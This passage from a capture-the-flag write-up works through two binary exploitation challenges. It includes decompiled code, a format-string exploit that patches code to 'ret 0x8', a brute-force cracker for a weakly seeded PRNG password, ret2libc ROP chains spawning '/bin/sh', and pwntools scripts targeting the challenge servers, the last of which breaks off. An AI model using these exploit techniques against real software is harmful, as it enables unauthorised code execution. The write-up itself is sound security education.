+<span style="color:#66d9ef">MOV</span>        <span style="color:#66d9ef">RDI</span><span style="color:#960050;background-color:#1e0010">=&gt;</span><span style="color:#66d9ef">s_Thanks_for_modifying_the_byte</span>,<span style="color:#66d9ef">_g_004020</span>   <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Thanks</span> <span style="color:#66d9ef">for</span> 
+<span style="color:#66d9ef">CALL</span>       <span style="color:#66d9ef">libc.so.6</span>::<span style="color:#66d9ef">puts</span>                                  <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">puts</span>(<span style="color:#66d9ef">char</span> * 
+<span style="color:#66d9ef">MOV</span>        <span style="color:#66d9ef">EDI</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">CALL</span>       <span style="color:#66d9ef">FUN_00401120</span>                                     <span style="color:#66d9ef">undefined</span> <span style="color:#66d9ef">FUN_00401120</span>()
+<span style="color:#a6e22e">undefined</span> <span style="color:#66d9ef">win</span>():
+<span style="color:#a6e22e">ENDBR64</span>
+<span style="color:#a6e22e">PUSH</span>       <span style="color:#66d9ef">RBP</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RBP</span>,<span style="color:#66d9ef">RSP</span>
+</code></pre></div><p>So the <code>bye</code> function doesn&rsquo;t have a ret instruction, it just continues on into the win() function, but not before calling <code>FUN_00401120</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">undefined</span> <span style="color:#66d9ef">FUN_00401120</span>():
+<span style="color:#a6e22e">ENDBR64</span>
+<span style="color:#a6e22e">JMP</span>        <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">DAT_00404050</span>]                         <span style="color:#66d9ef">void</span> <span style="color:#66d9ef">exit</span>(<span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__status</span>)
+</code></pre></div><p>Alright so this is the <code>exit</code> function. It jumps execution to the pointer stored at <code>0x404050</code> which is <code>exit@GOT</code>.</p>
+
+
+
+<details>
+    <summary>Attempting To Corrupt the GOT</summary>
+   <p>My first thought was because there&rsquo;s only partial relro enabled that I should attempt to corrupt the Global Offset Table (GOT) to point to something besides exit. I realized I could take advantage of the fact <code>win</code> was immediately after the call to <code>FUN_00401120</code>. Instead of having to overwrite the GOT pointer to be the entire address, I could simply overwrite the GOT pointer to be any <code>ret</code> instruction and it&rsquo;d continue program execution after the function call.</p>
+<p>The printf vulnerability is severly limited for this technique though because I wouldn&rsquo;t be able to put exit@GOT on the stack due to it containing 2 <code>0x40</code>.</p>
+<p>But wait, I have the ability to copy an address from the stack and modify it. Unfortunately there doesn&rsquo;t exist any pointers on the stack that are 1 byte different from <code>0x404050</code>. There is a <code>0x40xx55</code> pointer, but this has very little use.</p>
+<p>Then I opted to look for pointer chains that would allow me to construct the pointer by using the printf and playing some format string golf. This proved to be promising at first as offset 16 pointed to offset 18 which was empty. By using the copy buffer I could copy the pointer at offset 16 and modify it to point ahead,allowing me to offsets to do 2 byte writes at. This allowed me to get the address <code>0x404050</code> on the stack at index 18, but I had no more room in my format string to write to it.</p>
+<p>Playing off this idea I began looking for pointer chains that pointed to an address with the structure <code>0x40XXXX</code> because I figured I could write <code>0x4050</code> to the lower 2 bytes with <code>%16463c%9$hn</code>. There also didn&rsquo;t seem to be sufficient pointers to allow me to do this.</p>
+<p>At this point I was lost. My teammate <strong>h3ll3r</strong> was also working on this challenge at this time. He mentioned there was a way to get a pointer to <code>puts@GOT</code>. Now the issue with overwriting puts is it&rsquo;s used within the function for <code>win</code> to print the flag, so we wouldn&rsquo;t be able to use it to directly jump to <code>win</code>, but I thought about using it to hijack control flow and upgrade the printf vulnerability we were working with. If we could overwrite puts to right before the scanf, then we&rsquo;d have infinite printf and surely we&rsquo;d be able to overwrite the exit pointer and continue into <code>win</code>. This tactic worked and allowed us to hijack control flow, but <code>scanf</code> kept segfaulting due to stack allignment. We wouldn&rsquo;t be able to jump to any sooner because prior to scanf its a puts call, so it&rsquo;d just give infinite recursion.</p>
+
+</details>
+
+<h3 id="exploit">Exploit</h3>
+<p>After a lot of trial and error, <strong>h3ll3r</strong> noticed that we could write to a pointer pointing to <code>exit@plt</code> with our printf write. <em>But wait, isn&rsquo;t that a non executable segment of memory?</em> Well the <code>init</code> function actually calls the <code>mprotect</code> syscall, making a large portion of memory RWX. This means we could theoretically overwrite the code that&rsquo;s within <code>FUN_00401120</code> entirely rather than the GOT entry that its code jumps to.</p>
+<p>Like I mentioned above with the GOT overwrite techinique, we can take advantage of the fact that immediately after the call to <code>FUN_00401120</code> the <code>win</code> function starts. Because CALL instructions place the next address on the stack as the return address, we can overwrite the assembly to <code>RET</code> and it should continue through to the next function.</p>
+<p>Doing so still causes segfaults, but we&rsquo;re segfaulting within the win function which is progress! It appears that stack allignment is still an issue. We continued to play around with things until <strong>h3ll3r</strong> realized that the <code>ret 0x8</code> instruction would return an addess off the stack, then adjust RSP by 8 bytes, fixing the stack alignment and ultimately giving the flag!</p>
+<p><code>CSCTF{y0u_Kn0W_fOrmA7_57r1NG_4nd_C4LL_BYTE5}</code></p>
+
+
+
+<details>
+    <summary>Exploit Code</summary>
+   <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> r2Attach <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+
+binary_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./chall&#34;</span>
+remote_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;byte-modification-service.challs.csc.tf:1337&#34;</span>
+use_remote <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> lbin <span style="color:#f92672">=</span> ELF(binary_path)
+
+<span style="color:#75715e"># Libc Stuff</span>
+libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+ld <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+
+<span style="color:#75715e"># Creates a radare2 debugging instance in another thread that stops local program execution.</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attachr2</span>(io, scr<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+    r2 <span style="color:#f92672">=</span> r2Attach(io, terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>])
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dbg</span>(r2, dbgscript<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+        print(<span style="color:#e6db74">&#34;Attaching with script:&#34;</span>, dbgscript)
+        r2<span style="color:#f92672">.</span>attach(dbgscript)
+
+    dbg_thread <span style="color:#f92672">=</span> Thread(target <span style="color:#f92672">=</span> dbg, args<span style="color:#f92672">=</span>[r2, scr])
+    dbg_thread<span style="color:#f92672">.</span>start()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(use_rem, binary, remote_target, libc<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, ld<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+    <span style="color:#66d9ef">if</span> use_rem:
+        t <span style="color:#f92672">=</span> remote_target<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)
+        <span style="color:#66d9ef">return</span> remote(t[<span style="color:#ae81ff">0</span>], int(t[<span style="color:#ae81ff">1</span>]))
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">if</span> libc <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> ld <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
+            <span style="color:#66d9ef">return</span> process([ld<span style="color:#f92672">.</span>path, binary<span style="color:#f92672">.</span>path], env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: libc<span style="color:#f92672">.</span>path})
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> process()
+
+io <span style="color:#f92672">=</span> connect(use_remote, lbin, remote_url, libc, ld)
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> use_remote:
+    attachr2(io, r2script)
+
+<span style="color:#75715e"># Create pointer to 0x401120 in copy buffer.</span>
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;39&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;16&#34;</span>)
+
+<span style="color:#75715e"># Write \xc2\x08 (ret 0x8) to 0x401120</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%2241c</span><span style="color:#e6db74">%9$n&#34;</span>
+
+input(<span style="color:#e6db74">&#34;Waiting&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(payload)
+
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+</details>
+
+<hr>
+<h2 id="ticket-bot-v1">Ticket Bot V1</h2>
+<p>I&rsquo;m given glibc 2.31 and a binary &ldquo;chal&rdquo; with the following protections:</p>
+<ul>
+<li>Arch:     amd64-64-little</li>
+<li>RELRO:    Full RELRO</li>
+<li>Stack:    No canary found</li>
+<li>NX:       NX enabled</li>
+<li>PIE:      PIE enabled</li>
+</ul>
+<p>Immediately I&rsquo;m thinking buffer overflow because stack canary is disabled. Also given I have a glibc version supplied, it&rsquo;d make sense that I&rsquo;m going to be doing some version of ret2libc, unless the exploit code is dependent on glibc 2.31 functionality.</p>
+<p>Opening the binary in Ghidra yields the following for the <code>main</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>param_1)
+
+{
+  init(param_1);
+  wellcome();
+  <span style="color:#66d9ef">do</span> {
+    menu();
+  } <span style="color:#66d9ef">while</span>( true );
+}
+</code></pre></div><p>I start with an <code>init</code> function. Based on how I completely missed something in the init function in the last challenge, I decided to pay much closer attention to this one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>ctx)
+
+{
+  <span style="color:#66d9ef">char</span> local_20 [<span style="color:#ae81ff">8</span>];
+  <span style="color:#66d9ef">int</span> local_18;
+  uint local_14;
+  FILE <span style="color:#f92672">*</span>local_10;
+  
+  setvbuf(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  setvbuf(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  local_10 <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>);
+  fgets(local_20,<span style="color:#ae81ff">8</span>,local_10);
+  fclose(local_10);
+  local_14 <span style="color:#f92672">=</span> (uint)local_20;
+  srand(local_14);
+  local_18 <span style="color:#f92672">=</span> rand();
+  seed <span style="color:#f92672">=</span> local_18 <span style="color:#f92672">%</span> <span style="color:#ae81ff">10000000</span>;
+  srand(seed);
+  password <span style="color:#f92672">=</span> rand();
+  <span style="color:#66d9ef">return</span> password;
+}
+</code></pre></div>
+
+
+
+
+<div class="tabs-container">
+    <div class="tabs" role="tablist">
+
+	    
+        
+            
+            <button class="tab active" id="bafcde">
+            
+
+                Bad Random
+            </button>
+
+	    
+        
+            
+            <button class="tab" id="afebdc">
+            
+
+                What&#39;s a PRNG?
+            </button>
+
+	    
+
+    </div>
+
+    
+    
+        
+            <div class="tabcontent bafcde" style="display:block;">
+        
+
+        <p>So a random 8 byte value is read from <code>/dev/urandom/</code> and is supplied to <code>srand</code> to seed glibc PRNG. Immediately after, a value is generated by the PRNG and stored <code>mod 10,000,000</code>. This value is then used to seed the PRNG again, subsequently generating a value called <code>password</code>.</p>
+<p>This is automatically a red flag because we know the constraints of the <code>seed</code> now to be a value between 0 and 10,000,000, a lot smaller than the 8 byte max of 18,446,744,073,709,551,615. If found to be advantagous, I could crack the seed within seconds and retrieve the password given something to validate with.</p>
+
+        
+        
+    </div>
+    
+    
+        
+            <div class="tabcontent afebdc">
+        
+
+        <p>A Pseudo-Random Number Generator <code>PRNG</code> is a algorithm developed to generate seemingly random numbers based off of a state. There&rsquo;s a few cool things about PRNG:</p>
+<ol>
+<li><strong>They&rsquo;re deterministic</strong>:  PRNG will typically receive a value called a <code>seed</code> and will use that to construct a <code>state</code>. A state for a PRNG will develop the same sequence of numbers each time.</li>
+<li><strong>They&rsquo;re leakable</strong>: The numbers generated represent the state of the PRNG. The state is typically an array of numbers and when a new number is generated, multiple numbers within this array are used to calculate the new number. Typically these values will then be placed within the state, so consecutive generated numbers can be used to reconstruct the state and predict future numbers.</li>
+</ol>
+<p>PRNG should never be used for sensitive data or data that shouldn&rsquo;t be predicted. This is the use for Cryptographically Random Number Generators like <code>/dev/urandom</code>. Even if the seed set is massive, given enough time the seed OR state statistically could be reversed, causing potential security risks.</p>
+
+        
+        
+    </div>
+    
+</div>
+
+<p>Now looking into the <code>wellcome</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">wellcome</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  uint uVar1;
+  
+  uVar1 <span style="color:#f92672">=</span> rand();
+  printf(<span style="color:#e6db74">&#34;Wellcome to TicketBot v1.0 here is your ticketID %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)uVar1);
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>I see that a number is generated from the PRNG and given to me. This is a nice leak to have because I can use this to validate the seed like mentioned above.</p>
+<p>Looking into the <code>menu</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">menu</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> local_c;
+  
+  puts(<span style="color:#e6db74">&#34;========================&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;1. New Ticket&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;2. Service Login&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;========================&#34;</span>);
+  local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_00102075,<span style="color:#f92672">&amp;</span>local_c);
+  getchar();
+  <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+    GrabNewTicket();
+  }
+  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+    ServiceLogin();
+  }
+  <span style="color:#66d9ef">else</span> {
+    puts(<span style="color:#e6db74">&#34;that is not an option&#34;</span>);
+  }
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>I have 2 options:</p>
+<ol>
+<li>New Ticket</li>
+<li>Service Login</li>
+</ol>
+<p>Looking into <code>GrabNewTicket</code> first:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GrabNewTicket</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  uint uVar1;
+  
+  uVar1 <span style="color:#f92672">=</span> rand();
+  printf(<span style="color:#e6db74">&#34;your new ticketID is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)uVar1);
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>It appears to be almost the same as the <code>wellcome</code> function. This is nice because this would allow me to leak another number to nearly 100% validate that I do find the correct seed if I choose to go down that path.</p>
+<p>Below is the function for <code>ServiceLogin</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ServiceLogin</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> local_c;
+  
+  puts(<span style="color:#e6db74">&#34;Admin Password&#34;</span>);
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_00102075,<span style="color:#f92672">&amp;</span>local_c);
+  <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> password) {
+    AdminMenu();
+    <span style="color:#66d9ef">return</span>;
+  }
+  puts(<span style="color:#e6db74">&#34;wrong Password&#34;</span>);
+  exit(<span style="color:#ae81ff">0</span>);
+}
+</code></pre></div><p>Alright so it&rsquo;s clear that the seed is something I&rsquo;ll need to crack in order to retrieve the password to access some admin options.</p>
+<h3 id="seed-cracker">Seed Cracker</h3>
+<p>So I know the constraints of the seed and that I&rsquo;m trying to retrieve the first value generated by the state from said seed. I also have the ability to get infinite numbers from the PRNG if I so please. Below is a C utility I wrote to go through all numbers 0-10000000, generate 3 random numbers from it, and check the last 2 with 2 numbers supplied from stdin. If the numbers match, then it returns the first number generated by the PRNG for that seed which happens to be the <code>password</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">find_seed</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num2) {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; seed <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10000000</span>; seed<span style="color:#f92672">++</span>) {
+        srand(seed);
+        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> first <span style="color:#f92672">=</span> rand();
+
+        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> check1 <span style="color:#f92672">=</span> rand();
+        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> check2 <span style="color:#f92672">=</span> rand();
+
+        <span style="color:#66d9ef">if</span> (check1 <span style="color:#f92672">==</span> num1 <span style="color:#f92672">&amp;&amp;</span> check2 <span style="color:#f92672">==</span> num2) {
+            <span style="color:#66d9ef">return</span> first;
+        }
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num1, num2;
+    <span style="color:#66d9ef">if</span> (scanf(<span style="color:#e6db74">&#34;%u %u&#34;</span>, <span style="color:#f92672">&amp;</span>num1, <span style="color:#f92672">&amp;</span>num2) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {
+        fprintf(stderr, <span style="color:#e6db74">&#34;Error reading input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> find_seed(num1, num2);
+    printf(<span style="color:#e6db74">&#34;The first random number generated is: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h3 id="admin-exploit">Admin Exploit</h3>
+<p>Now that I have the password, I can begin looking into the admin functionality. Below is the <code>AdminMenu</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">AdminMenu</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> local_14;
+  <span style="color:#66d9ef">char</span> local_10 [<span style="color:#ae81ff">4</span>];
+  <span style="color:#66d9ef">int</span> local_c;
+  
+  puts(<span style="color:#e6db74">&#34;========================&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;1. change Admin Password&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;2. reset all Tickets&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;========================&#34;</span>);
+  local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_00102075,<span style="color:#f92672">&amp;</span>local_14);
+  getchar();
+  <span style="color:#66d9ef">if</span> (local_14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+    puts(<span style="color:#e6db74">&#34;Enter new Password&#34;</span>);
+    __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_001020e1,local_10);
+    password <span style="color:#f92672">=</span> atoi(local_10);
+    local_c <span style="color:#f92672">=</span> password;
+    puts(<span style="color:#e6db74">&#34;Password changed to&#34;</span>);
+    printf(local_10);
+  }
+  <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">if</span> (local_14 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+      exit(<span style="color:#ae81ff">0</span>);
+    }
+    puts(<span style="color:#e6db74">&#34;Reset done!&#34;</span>);
+  }
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>I see that the first option has as <code>printf</code> vulnerability right off the bat, albeit limited. This would be perfect to give me some sort of pointer leak. Additionally, the <code>scanf</code> function uses the <code>%s</code> verb which has no limit on the amount of characters it reads. Because there&rsquo;s no stack canaries, it&rsquo;d be trivial to do ROP after we achieve a pointer leak. Even if there was canaries, I could leak them with the <code>prinf</code> I have.</p>
+<p>Looking on the stack, I noticed offset 9 had a pointer pointing to an address in <code>.text</code>, so I used <code>%9$p</code> to leak the pointer and calculate the base address of the binary.</p>
+<h3 id="ret2libc">Ret2Libc</h3>
+<p>Now that I have a base address, I can begin moving towards my next objective: ret2libc. I&rsquo;m doing this for 2 main reasons:</p>
+<ol>
+<li>I have the libc version on hand.</li>
+<li>I don&rsquo;t have much if anything to spawn a shell within the binary.</li>
+</ol>
+<p>In order to get a libc leak I opted to use <code>puts</code> to leak the GOT of <code>puts</code> because I had a <code>pop rdi; ret</code> gadget in the main binary. After obtaining my leak I&rsquo;d jump execution back to <code>AdminMenu</code> so I wouldn&rsquo;t have to do the login sequence again:</p>
+<pre tabindex="0"><code>0x00 8 bytes of padding
+0x08 8 null bytes for RBP
+0x10 ret for stack alignment
+0x18 pop rdi; ret
+0x20 puts@GOT address
+0x28 puts@PLT address
+0x30 ret for stack alignment
+0x38 AdminMenu
+</code></pre><p>Now I&rsquo;ve obtained a libc leak of <code>puts</code> that allows me to calculate the base address of libc. Given that I have the base address of libc, I can begin formulating a payload to call libc <code>system</code> with the <code>/bin/sh</code> string from within libc. Using the same <code>pop rdi; ret</code> gadget as before, I created a ROP chain to spawn a shell:</p>
+<pre tabindex="0"><code>0x00 8 bytes of padding
+0x08 8 null bytes for RBP
+0x10 pop rdi; ret
+0x18 /bin/sh address
+0x20 ret for stack alignment
+0x28 system
+</code></pre><p><code>CSCTF{r4nd_funk7i0n_i5_n0t_s0_r4nd0m3_a5_y0u_th0ugh7}</code></p>
+
+
+
+<details>
+    <summary>Exploit Code</summary>
+   <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> r2Attach <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+
+binary_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./chal&#34;</span>
+remote_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ticket-bot.challs.csc.tf:1337&#34;</span>
+use_remote <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> lbin <span style="color:#f92672">=</span> ELF(binary_path)
+
+<span style="color:#75715e"># Libc Stuff</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;ld-linux-x86-64.so.2&#34;</span>)
+
+<span style="color:#75715e"># Creates a radare2 debugging instance in another thread that stops local program execution.</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attachr2</span>(io, scr<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+    r2 <span style="color:#f92672">=</span> r2Attach(io, terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>])
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dbg</span>(r2, dbgscript<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+        print(<span style="color:#e6db74">&#34;Attaching with script:&#34;</span>, dbgscript)
+        r2<span style="color:#f92672">.</span>attach(dbgscript)
+
+    dbg_thread <span style="color:#f92672">=</span> Thread(target <span style="color:#f92672">=</span> dbg, args<span style="color:#f92672">=</span>[r2, scr])
+    dbg_thread<span style="color:#f92672">.</span>start()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(use_rem, binary, remote_target, libc<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, ld<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+    <span style="color:#66d9ef">if</span> use_rem:
+        t <span style="color:#f92672">=</span> remote_target<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)
+        <span style="color:#66d9ef">return</span> remote(t[<span style="color:#ae81ff">0</span>], int(t[<span style="color:#ae81ff">1</span>]))
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">if</span> libc <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> ld <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
+            <span style="color:#66d9ef">return</span> process([ld<span style="color:#f92672">.</span>path, binary<span style="color:#f92672">.</span>path], env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: libc<span style="color:#f92672">.</span>path})
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> process()
+
+io <span style="color:#f92672">=</span> connect(use_remote, lbin, remote_url, libc, ld)
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> use_remote:
+    attachr2(io, r2script)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_ticket</span>(io):
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2. Service Login&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;your new ticketID is &#34;</span>)
+    x <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
